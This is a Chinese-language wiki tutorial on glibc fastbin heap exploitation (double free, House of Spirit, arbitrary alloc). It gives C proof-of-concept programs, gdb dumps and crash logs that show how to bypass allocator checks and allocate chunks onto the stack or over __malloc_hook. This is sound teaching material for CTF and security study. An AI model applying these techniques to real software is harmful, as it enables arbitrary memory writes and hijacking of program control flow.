# fastbin attack

标签（空格分隔）： wiki

---

## 介绍
fastbin attack是一种(或多种)堆漏洞的利用方法，这种方法需要使用fastbin的特性，因此需要漏洞发生在属于fastbin的chunk中。
基于这一点我们可以知道这种利用的前提是：

* 存在堆溢出、use-after-free等能控制chunk内容的漏洞
* 漏洞发生于属于fastbin的chunk中

## 原理
fastbin attack存在的原因在于fastbin是使用单链表来维护释放的堆块的，并且由fastbin管理的chunk即使被释放其next_chunk的pre_inuse位也不会被置为空。
我们实际的来看一下fastbin是怎样的管理被释放的chunk的。
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    //进行释放
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
```
释放前
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000041 <=== chunk2
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000041 <=== chunk3
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
```
执行三个free进行释放后
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000041 <=== chunk2
0x602050:	0x0000000000602000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000041 <=== chunk3
0x602090:	0x0000000000602040	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
```
此时位于main_arena中的fastbin链表中已经储存了指向chunk3的指针，并且chunk3、2、1构成了一个单链表
```
Fastbins[idx=2, size=0x30,ptr=0x602080]
===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) 
```
我们可以使用如下的图片来表示这一点
![捕获.PNG-13.8kB][1]


## 分类
fastbin attack是一个统称，意为所有基于fastbin的利用，如果细分可以做如下的分类：

* fastbin double free
* House of Spirit
* arbitrary alloc

## fastbin double free
fastbin double free是指一个属于fastbin的chunk可以多次被释放并多次的存在于fastbin链表中。这样导致的后果是多次分配可以从fastbin链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。

## 演示
fastbin double free之所以能够成功的实现有两部分的原因，一是属于fastbin的堆块被释放后next_chunk的pre_inuse位不会被清空，二是fastbin在执行free的时候仅验证了main_arena直接指向的块
```
/* Another simple check: make sure the top of the bin is not the
	   record we are going to add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  {
	    errstr = "double free or corruption (fasttop)";
	    goto errout;
}
```
下面的示例程序说明了这一点，当我们试图执行以下代码时
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);
    
    free(chunk1);
    free(chunk1);
    return 0;
}
```
如果你执行这个程序，不出意外的话会得到如下的结果，这正是_int_free函数检测到了fastbin的double free。
```
*** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0 
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0 
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0 
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0 
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0 
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0 
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
```
如果我们在chunk1释放后，再释放chunk2，这样main_arena就指向chunk2而不是chunk1了，此时我们再去释放chunk1就不再会被检测到。
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);
    
    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```
第一次释放`free(chunk1)`
![捕获.PNG-3kB][2]
第二次释放`free(chunk2)`
![捕获.PNG-3.4kB][3]
第三次释放`free(chunk1)`
![捕获.PNG-5.8kB][4]
注意因为chunk1被再次释放因此其fd值不再为0而是指向chunk2，这时如果我们可以控制chunk1的内容，便可以写入其fd指针从而实现在我们想要的任意地址分配fastbin块。

下面这个示例演示了这一点，首先跟前面一样构造main_arena=>chunk1=>chun2=>chunk1的链表。之后第一次调用malloc返回chunk1之后修改chunk1的fd指针指向bss段上的bss_chunk，之后我们可以看到fastbin会把堆块分配到这里。
```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;
    
    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);
    
    free(chunk1);
    free(chunk2);
    free(chunk1);
    
    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}
```
在我的系统上chunk_b输出的值会是0x601090，这个值位于bss段中正是我们之前设置的`CHUNK bss_chunk`
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 <bss_chunk>:	0x0000000000000000	0x0000000000000021
0x601090 <bss_chunk+16>:0x0000000000000000	0x0000000000000000
0x6010a0:	            0x0000000000000000	0x0000000000000000
0x6010b0:	            0x0000000000000000	0x0000000000000000
0x6010c0:	            0x0000000000000000	0x0000000000000000
```
值得注意的是我们在main函数的第一步就进行了`bss_chunk.size=0x21;`的操作，这是因为_int_malloc会对欲分配位置的size域进行验证，如果其size与当前fastbin链表应有size不符就会抛出异常。
```
*** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0 
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0 
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0 
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0 
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0 
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0 
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放弃 (核心已转储)
```
_int_malloc中的校验如下
```
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
	{
	  errstr = "malloc(): memory corruption (fast)";
	errout:
	  malloc_printerr (check_action, errstr, chunk2mem (victim));
	  return NULL;
}
```

##小总结
通过fastbin double free我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。
如果是更进一步的修改fd指针，则能够实现任意地址分配堆块的效果(首先要通过验证)，这就相当于任意地址写任意值的效果。


## House of Spirit
House of Spirit是House of XX的一种,House of XX是2004年左右发出来的一篇关于Linux堆利用的技术文章中提出一系列利用方法。
对HOS的描述是可以使得fastbin堆块分配到栈中，从而实现控制栈中的一些关键数据，比如返回地址等。
</br>
如果你已经理解了前文所讲的fastbin double free，那么相信你理解HOS就已经不成问题了，其实它们的本质都在于fastbin链表是使用当前chunk的fd指针指向下一个chunk构成的。</br>
HOS的核心同样在于劫持fastbin链表中chunk的fd指针，把fd指针指向我们想要分配的栈上，实现控制栈中数据。

## 演示
这次我们把fake_chunk置于栈中称为stack_chunk，同时劫持了fastbin链表中chunk的fd值，通过把这个fd值指向stack_chunk就可以实现在栈中分配fastbin chunk。
```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;  
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;
    
    void *chunk1;
    void *chunk_a;
    
    stack_chunk.size=0x21;
    chunk1=malloc(0x10);
    
    free(chunk1);
    
    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```
通过gdb调试可以看到我们首先把chunk1的fd指针指向了stack_chunk
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x00007fffffffde60	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
```
之后第一次malloc使得fastbin链表指向了stack_chunk，这意味着下一次分配会使用stack_chunk的内存进行
```
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000 <=== unsorted bin
0x7ffff7dd1b28 <main_arena+8>:  0x00007fffffffde60 <=== fastbin[0]
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	
```
最终第二次malloc返回值为0x00007fffffffde70也就是stack_chunk
```
   0x400629 <main+83>        call   0x4004c0 <malloc@plt>
 → 0x40062e <main+88>        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70
   
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw- 
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]

```


##小总结
通过HOS我们可以把fastbin chunk分配到栈中，从而控制返回地址等关键数据。</br>
要实现这一点我们需要劫持fastbin中chunk的fd域，把它指到栈上，当然同时需要栈上存在有满足条件的size值。


## arbitrary alloc
arbitrary alloc其实与House of Spirit是完全相同的，唯一的区别是分配的目标不再是栈中。
事实上只要满足目标地址存在合法的size域，我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等等。

## 演示
有些同学可能会认为HOS与arbitrary alloc没有什么区别因此没有必要分为两类，这里我们使用如下的这个例子来说明这种利用手法与HOS的意义是不同的。</br>
这个例子是使用字节错位来实现直接分配fastbin到__malloc_hook的位置，相当于直接写入__malloc_hook来控制程序流程。
```
int main(void)
{
    
    
    void *chunk1;
    void *chunk_a;
    
    chunk1=malloc(0x60);
    
    free(chunk1);
    
    *(long long *)chunk1=0x7ffff7dd1b05;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```
这里的0x7ffff7dd1b05是我根据本机的情况得出的值，这个值是怎么获得的呢？首先我们要观察欲写入地址附近是否存在可以字节错位的情况</br>
```
0x7ffff7dd1a88 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1a90 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1a98 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1aa0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1aa8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ab0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ab8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ac0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ac8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ad0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ad8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ae0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ae8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1b00 0x20	0x2e 0xa9 0xf7 0xff	0x7f 0x0 0x0
0x7ffff7dd1b08 0x0	0x2a 0xa9 0xf7 0xff	0x7f 0x0 0x0
0x7ffff7dd1b10 <__malloc_hook>:	0x30	0x28	0xa9	0xf7	0xff	0x7f	0x0	0x0
```
0x7ffff7dd1b10是我们想要控制的__malloc_hook的内容，于是我们向上寻找是否可以错位出一个合法的size域。因为我们是在64位系统下进行的调试，因此fastbin的范围为32字节到128字节(0x20-0x80),如下：
```
//这里的size指用户区域，因此要小2倍字长
Fastbins[idx=0, size=0x10] 
Fastbins[idx=1, size=0x20] 
Fastbins[idx=2, size=0x30] 
Fastbins[idx=3, size=0x40] 
Fastbins[idx=4, size=0x50] 
Fastbins[idx=5, size=0x60] 
Fastbins[idx=6, size=0x70] 
```
通过观察发现0x7ffff7dd1af5处可以现实错位构造出一个0x000000000000007f
```
0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0

0x7ffff7dd1af5 <_IO_wide_data_0+309>:	0x000000000000007f
```
因为0x7f是属于0x70的，而其大小又包含了0x10的chunk_header因此我们选择分配0x60的fastbin，将其加入链表。</br>
最后经过两次分配可以观察到chunk被分配到0x00007ffff7dd1b15，因此我们就可以直接控制__malloc_hook的内容。

```
0x4005a8 <main+66>        call   0x400450 <malloc@plt>
 →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax
 
 $rax   : 0x00007ffff7dd1b15 
 
0x7ffff7dd1b05 <__memalign_hook+5>:	0xfff7a92a0000007f	0x000000000000007f
0x7ffff7dd1b15 <__malloc_hook+5>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b25 <main_arena+5>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b35 <main_arena+21>:	0x0000000000000000	0x0000000000000000
```


## 小总结
虽然arbitrary alloc与HOS的原理是相同的，但是arbitrary alloc在CTF中要比HOS更常出现也更加使用。</br>
我们可以利用字节错位等方法来绕过size域的检验，实现任意地址分配chunk，最后的效果也就相当于任意地址写任意值。


  [1]: http://static.zybuluo.com/vbty/e8k7kq9w9a0fzm0qxfpzwpw5/%E6%8D%95%E8%8E%B7.PNG
  [2]: http://static.zybuluo.com/vbty/48ue5xatzz40sif5qnqu8syz/%E6%8D%95%E8%8E%B7.PNG
  [3]: http://static.zybuluo.com/vbty/0101jwbohr0r8sjha5yvxuu6/%E6%8D%95%E8%8E%B7.PNG
  [4]: http://static.zybuluo.com/vbty/ggyvxt73jujf9qlcnm429khb/%E6%8D%95%E8%8E%B7.PNG